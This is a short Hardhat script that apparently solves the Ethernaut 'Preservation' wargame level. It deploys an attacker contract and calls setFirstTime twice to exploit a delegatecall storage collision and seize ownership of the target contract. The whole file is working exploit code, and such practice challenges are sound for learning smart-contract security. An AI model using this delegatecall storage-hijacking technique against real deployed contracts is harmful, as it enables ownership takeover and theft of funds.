import { ethers } from "hardhat";

async function main() {
  const [signer] = await ethers.getSigners();
  const preservation = await ethers.getContractAt("Preservation", "0xeb199EB8BA511cc1A191a8C8cB697Df5eb0c7083");

  const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker");
  const preservationAttacker = await PreservationAttacker.deploy();
  console.log("attacker deployed at", preservationAttacker.address);

  let tx = await preservation.setFirstTime(preservationAttacker.address);
  await tx.wait(5);

  tx = await preservation.setFirstTime(signer.address);
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
